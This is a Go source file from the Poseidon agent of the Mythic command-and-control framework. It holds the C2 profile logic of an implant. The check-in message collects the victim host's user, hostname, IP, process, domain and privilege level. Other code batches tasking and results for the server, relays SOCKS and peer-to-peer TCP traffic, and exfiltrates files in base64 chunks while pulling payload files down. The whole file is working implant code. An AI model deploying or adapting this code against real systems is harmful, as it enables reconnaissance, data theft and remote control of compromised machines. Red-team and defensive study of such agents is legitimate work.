package profiles

import (
	// Standard

	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/google/uuid"
)

var (
	// UUID is a per-payload identifier assigned by Mythic during creation
	UUID                  string
	MythicID              = ""
	SeededRand            = rand.New(rand.NewSource(time.Now().UnixNano()))
	TaskResponses         []json.RawMessage
	DelegateResponses     []structs.DelegateMessage
	P2PConnectionMessages []structs.P2PConnectionMessage
	// channel to process normal messages from P2P connection
	HandleInboundMythicMessageFromEgressP2PChannel = make(chan structs.MythicMessageResponse, 10)
	HandleMythicMessageToEgressFromP2PChannel      = make(chan bool)
	// channels to add/remove TCP connections connection
	AddNewInternalTCPConnectionChannel = make(chan net.Conn, 1)
	RemoveInternalTCPConnectionChannel = make(chan string, 1)
	InternalTCPConnections             = make(map[string]net.Conn)
	UUIDMappings                       = make(map[string]string)
	mu                                 sync.Mutex
	// process SOCKSv5 Messages from Mythic
	FromMythicSocksChannel = make(chan structs.SocksMsg, 100)

	// send SOCKSv5 Messages to Mythic
	ToMythicSocksChannel = make(chan structs.SocksMsg, 100)
)

func GetMythicID() string {
	return MythicID
}

func SetMythicID(newMythicID string) {
	MythicID = newMythicID
}

func GenerateSessionID() string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 20)
	for i := range b {
		b[i] = letterBytes[SeededRand.Intn(len(letterBytes))]
	}
	return string(b)
}

func getSocksChannelData(toMythicSocksChannel chan structs.SocksMsg) []structs.SocksMsg {
	var data = make([]structs.SocksMsg, 0)
	//fmt.Printf("***+ checking for data from toMythicSocksChannel\n")
	for {
		select {

		case msg, ok := <-toMythicSocksChannel:
			if ok {
				//fmt.Printf("Channel %d was read for post_response with length %d.\n", msg.ServerId, len(msg.Data))
				data = append(data, msg)
			} else {
				//fmt.Println("Channel closed!\n")
				return data
			}
		default:
			//fmt.Println("No Socks value ready, moving on.")
			return data
		}
	}
}

// gather profiles.TaskResponses, profiles.DelegateResponses, and getSocksChannelData into a post_response message
func CreateMythicMessage() *structs.MythicMessage {
	responseMsg := structs.MythicMessage{}
	responseMsg.Action = "get_tasking"
	responseMsg.TaskingSize = -1
	responseMsg.GetDelegateTasks = true
	SocksArray := getSocksChannelData(ToMythicSocksChannel)
	if len(TaskResponses) > 0 || len(DelegateResponses) > 0 || len(P2PConnectionMessages) > 0 {
		ResponseArray := make([]json.RawMessage, 0)
		DelegateArray := make([]structs.DelegateMessage, 0)
		P2PConnectionsArray := make([]structs.P2PConnectionMessage, 0)
		mu.Lock()
		ResponseArray = append(ResponseArray, TaskResponses...)
		DelegateArray = append(DelegateArray, DelegateResponses...)
		P2PConnectionsArray = append(P2PConnectionsArray, P2PConnectionMessages...)
		TaskResponses = make([]json.RawMessage, 0)
		DelegateResponses = make([]structs.DelegateMessage, 0)
		P2PConnectionMessages = make([]structs.P2PConnectionMessage, 0)
		mu.Unlock()
		if len(ResponseArray) > 0 {
			responseMsg.Responses = &ResponseArray
		}
		if len(DelegateArray) > 0 {
			responseMsg.Delegates = &DelegateArray
		}
		if len(P2PConnectionsArray) > 0 {
			responseMsg.Edges = &P2PConnectionsArray
		}
	}
	if len(SocksArray) > 0 {
		responseMsg.Socks = &SocksArray
	}
	return &responseMsg
}

func CreateCheckinMessage() interface{} {
	currentUser := functions.GetUser()
	hostname := functions.GetHostname()
	currIP := functions.GetCurrentIPAddress()
	currPid := functions.GetPID()
	OperatingSystem := functions.GetOS()
	arch := functions.GetArchitecture()
	processName := functions.GetProcessName()
	domain := functions.GetDomain()
	checkin := structs.CheckInMessage{
		Action:       "checkin",
		IP:           currIP,
		OS:           OperatingSystem,
		User:         currentUser,
		Host:         hostname,
		Pid:          currPid,
		UUID:         UUID,
		Architecture: arch,
		Domain:       domain,
		ProcessName:  processName,
	}

	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}
	return checkin
}

func SendTCPData(sendData []byte, conn net.Conn) error {
	err := binary.Write(conn, binary.BigEndian, int32(len(sendData)))
	if err != nil {
		fmt.Printf("Failed to send down pipe with error: %v\n", err)
		return err
	}
	_, err = conn.Write(sendData)
	if err != nil {
		fmt.Printf("Failed to send with error: %v\n", err)
		return err
	}
	//fmt.Printf("Sent %d bytes to connection\n", totalWritten)
	return nil
}
func GetInternalConnectionUUID(oldUUID string) string {
	if newUUID, ok := UUIDMappings[oldUUID]; ok {
		return newUUID
	}
	return oldUUID
}
func CheckIfNewInternalTCPConnection(newConnectionString string) bool {
	// check to see if newInternalChannel.RemoteAddr().String() exists already
	//fmt.Printf("Checking if connection string is new: %s\n", newConnectionString)
	//printInternalTCPConnectionMap()
	for _, v := range InternalTCPConnections {
		if v.RemoteAddr().String() == newConnectionString {
			return false
		}
	}
	return true
}
func AddNewInternalTCPConnection(newInternalChannel net.Conn) string {
	connectionUUID := uuid.New().String()
	//fmt.Printf("AddNewInternalConnectionChannel with UUID ( %s ) for %v\n", connectionUUID, newInternalChannel)
	InternalTCPConnections[connectionUUID] = newInternalChannel
	return connectionUUID
}
func RemoveInternalTCPConnection(connectionUUID string) bool {
	if conn, ok := InternalTCPConnections[connectionUUID]; ok {
		//fmt.Printf("about to remove a connection, %s\n", connectionUUID)
		printInternalTCPConnectionMap()
		conn.Close()
		delete(InternalTCPConnections, connectionUUID)
		//fmt.Printf("connection removed, %s\n", connectionUUID)
		printInternalTCPConnectionMap()
		return true
	} else {
		// we don't know about this connection we're asked to close
		return false
	}
}
func HandleDelegateMessageForInternalTCPConnections(delegates []structs.DelegateMessage) {
	for i := 0; i < len(delegates); i++ {
		//fmt.Printf("HTTP's HandleInternalDelegateMessages going to linked node: %v\n", delegates[i])
		// check to see if this message goes to something we know about
		if conn, ok := InternalTCPConnections[delegates[i].UUID]; ok {
			if delegates[i].MythicUUID != "" {
				// Mythic told us that our UUID was fake and gave the right one
				InternalTCPConnections[delegates[i].MythicUUID] = conn
				// remove our old one
				delete(InternalTCPConnections, delegates[i].UUID)
				UUIDMappings[delegates[i].UUID] = delegates[i].MythicUUID
			}
			//fmt.Printf("HTTP's sending data: ")
			err := SendTCPData([]byte(delegates[i].Message), conn)
			if err != nil {
				//fmt.Printf("Failed to send data, should adjust connection information based on error: %v\n", err)

			}
		}
	}
}
func printInternalTCPConnectionMap() {
	fmt.Printf("----- InternalTCPConnectionsMap ------\n")
	for k, v := range InternalTCPConnections {
		fmt.Printf("ID: %s, Connection: %s\n", k, v.RemoteAddr().String())
	}
	fmt.Printf("---- done -----\n")
}

//SendFileChunks - Helper function to deal with sending files from agent to Mythic
func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
	var size int64
	if sendFileToMythic.Data == nil {
		if sendFileToMythic.File == nil {
			errResponse := structs.Response{}
			errResponse.Completed = true
			errResponse.TaskID = sendFileToMythic.Task.TaskID
			errResponse.UserOutput = fmt.Sprintf("No data and no file specified when trying to send a file to Mythic")
			sendFileToMythic.Task.Job.SendResponses <- errResponse
			sendFileToMythic.FinishedTransfer <- 1
			return
		} else {
			fi, err := sendFileToMythic.File.Stat()
			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = sendFileToMythic.Task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
			size = fi.Size()
		}
	} else {
		size = int64(len(*sendFileToMythic.Data))
	}

	const FILE_CHUNK_SIZE = 512000 //Normal mythic chunk size
	chunks := uint64(math.Ceil(float64(size) / FILE_CHUNK_SIZE))
	fileDownloadData := structs.FileDownloadMessage{}
	fileDownloadData.TotalChunks = int(chunks)
	abspath, err := filepath.Abs(sendFileToMythic.FullPath)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = sendFileToMythic.Task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error getting full path to file: %s", err.Error())
		sendFileToMythic.Task.Job.SendResponses <- errResponse
		sendFileToMythic.FinishedTransfer <- 1
		return
	}
	fileDownloadData.FullPath = abspath
	fileDownloadData.IsScreenshot = sendFileToMythic.IsScreenshot
	// create our normal response message and add our Download part to it
	fileDownloadMsg := structs.Response{}
	fileDownloadMsg.TaskID = sendFileToMythic.Task.TaskID
	fileDownloadMsg.Download = &fileDownloadData
	fileDownloadMsg.TrackingUUID = sendFileToMythic.TrackingUUID
	// send the initial message to Mythic to announce we have a file to transfer
	sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg

	var fileDetails map[string]interface{}

	for {
		// Wait for a response from the channel
		resp := <-sendFileToMythic.FileTransferResponse
		err := json.Unmarshal(resp, &fileDetails)
		//fmt.Printf("Got %v back from file download first response", fileDetails)
		if err != nil {
			errResponse := structs.Response{}
			errResponse.Completed = true
			errResponse.TaskID = sendFileToMythic.Task.TaskID
			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
			sendFileToMythic.Task.Job.SendResponses <- errResponse
			sendFileToMythic.FinishedTransfer <- 1
			return
		}

		//log.Printf("Receive file download registration response %s\n", resp)
		if _, ok := fileDetails["file_id"]; ok {
			if ok {
				updateUserOutput := structs.Response{}
				updateUserOutput.TaskID = sendFileToMythic.Task.TaskID
				updateUserOutput.UserOutput = "{\"file_id\": \"" + fmt.Sprintf("%v", fileDetails["file_id"]) + "\", \"total_chunks\": \"" + strconv.Itoa(int(chunks)) + "\"}\n"
				sendFileToMythic.Task.Job.SendResponses <- updateUserOutput
				break
			} else {
				//log.Println("Didn't find response with file_id key")
				continue
			}
		}
	}
	var r *bytes.Buffer = nil
	if sendFileToMythic.Data != nil {
		r = bytes.NewBuffer(*sendFileToMythic.Data)
	} else {
		sendFileToMythic.File.Seek(0, 0)
	}
	lastPercentCompleteNotified := 0
	for i := uint64(0); i < chunks; {
		if sendFileToMythic.Task.ShouldStop() {
			// tasked to stop, so bail
			sendFileToMythic.FinishedTransfer <- 1
			return
		}
		time.Sleep(time.Duration(sendFileToMythic.Task.Job.C2.GetSleepTime()) * time.Second)
		partSize := int(math.Min(FILE_CHUNK_SIZE, float64(int64(size)-int64(i*FILE_CHUNK_SIZE))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		if sendFileToMythic.Data != nil {
			_, err = r.Read(partBuffer)
			if err != io.EOF && err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = sendFileToMythic.Task.TaskID
				errResponse.UserOutput = fmt.Sprintf("\nError reading from file: %s\n", err.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
		} else {
			sendFileToMythic.File.Seek(int64(i*FILE_CHUNK_SIZE), 1)
			_, err = sendFileToMythic.File.Read(partBuffer)
			if err != io.EOF && err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = sendFileToMythic.Task.TaskID
				errResponse.UserOutput = fmt.Sprintf("\nError reading from file: %s\n", err.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
		}

		fileDownloadData := structs.FileDownloadMessage{}
		fileDownloadData.ChunkNum = int(i) + 1
		//fileDownloadData.TotalChunks = -1
		fileDownloadData.FileID = fileDetails["file_id"].(string)
		fileDownloadData.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		fileDownloadMsg.Download = &fileDownloadData
		sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg
		newPercentComplete := ((fileDownloadData.ChunkNum * 100) / int(chunks))
		if newPercentComplete/10 > lastPercentCompleteNotified && sendFileToMythic.SendUserStatusUpdates {
			response := structs.Response{}
			response.Completed = false
			response.TaskID = sendFileToMythic.Task.TaskID
			response.UserOutput = fmt.Sprintf("File Transfer Update: %d%% complete\n", newPercentComplete)
			sendFileToMythic.Task.Job.SendResponses <- response
			lastPercentCompleteNotified = newPercentComplete / 10
		}
		// Wait for a response for our file chunk
		var postResp map[string]interface{}
		for {
			decResp := <-sendFileToMythic.FileTransferResponse
			err := json.Unmarshal(decResp, &postResp) // Wait for a response for our file chunk

			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = sendFileToMythic.Task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
			break
		}

		if strings.Contains(postResp["status"].(string), "success") {
			// only go to the next chunk if this one was successful
			i++
		}

	}
	sendFileToMythic.FinishedTransfer <- 1
	return
}

// Get a file
func GetFile(getFileFromMythic structs.GetFileFromMythicStruct) {
	// when we're done fetching the file, send a 0 byte length byte array to the getFileFromMythic.ReceivedChunkChannel
	fileUploadData := structs.FileUploadMessage{}
	fileUploadData.FileID = getFileFromMythic.FileID
	fileUploadData.ChunkSize = 512000
	fileUploadData.ChunkNum = 1
	fileUploadData.FullPath = getFileFromMythic.FullPath

	fileUploadMsg := structs.Response{}
	fileUploadMsg.TaskID = getFileFromMythic.Task.TaskID
	fileUploadMsg.Upload = &fileUploadData
	fileUploadMsg.TrackingUUID = getFileFromMythic.TrackingUUID

	getFileFromMythic.Task.Job.SendResponses <- fileUploadMsg
	rawData := <-getFileFromMythic.FileTransferResponse
	fileUploadMsgResponse := structs.FileUploadMessageResponse{} // Unmarshal the file upload response from mythic
	err := json.Unmarshal(rawData, &fileUploadMsgResponse)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = getFileFromMythic.Task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
		getFileFromMythic.Task.Job.SendResponses <- errResponse
		getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
		return
	}
	// inform the user that we started getting data and let them know how many chunks it'll be
	if getFileFromMythic.SendUserStatusUpdates {
		response := structs.Response{}
		response.Completed = false
		response.TaskID = getFileFromMythic.Task.TaskID
		response.UserOutput = fmt.Sprintf("Fetching file from Mythic with %d total chunks at %d bytes per chunk\n", fileUploadMsgResponse.TotalChunks, fileUploadData.ChunkSize)
		getFileFromMythic.Task.Job.SendResponses <- response
	}
	// start handling the data and sending it to the requesting task
	decoded, err := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = getFileFromMythic.Task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
		getFileFromMythic.Task.Job.SendResponses <- errResponse
		getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
		return
	}
	getFileFromMythic.ReceivedChunkChannel <- decoded
	// track the percentage of completion for file transfer for users so it's easier to see
	lastPercentCompleteNotified := 0
	if fileUploadMsgResponse.TotalChunks > 1 {
		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
			if getFileFromMythic.Task.ShouldStop() {
				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
				return
			}
			// update to the next chunk
			fileUploadMsg.Upload.ChunkNum = index
			// send the request
			getFileFromMythic.Task.Job.SendResponses <- fileUploadMsg
			// get the response
			rawData := <-getFileFromMythic.FileTransferResponse
			fileUploadMsgResponse = structs.FileUploadMessageResponse{} // Unmarshal the file upload response from apfell
			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = getFileFromMythic.Task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
				getFileFromMythic.Task.Job.SendResponses <- errResponse
				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
				return
			}
			// Base64 decode the chunk data
			decoded, err := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = getFileFromMythic.Task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
				getFileFromMythic.Task.Job.SendResponses <- errResponse
				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
				return
			}
			getFileFromMythic.ReceivedChunkChannel <- decoded
			newPercentComplete := ((index * 100) / fileUploadMsgResponse.TotalChunks)
			if newPercentComplete/10 > lastPercentCompleteNotified && getFileFromMythic.SendUserStatusUpdates {
				response := structs.Response{}
				response.Completed = false
				response.TaskID = getFileFromMythic.Task.TaskID
				response.UserOutput = fmt.Sprintf("File Transfer Update: %d%% complete\n", newPercentComplete)
				getFileFromMythic.Task.Job.SendResponses <- response
				lastPercentCompleteNotified = newPercentComplete / 10
			}
		}
	}
	getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
}
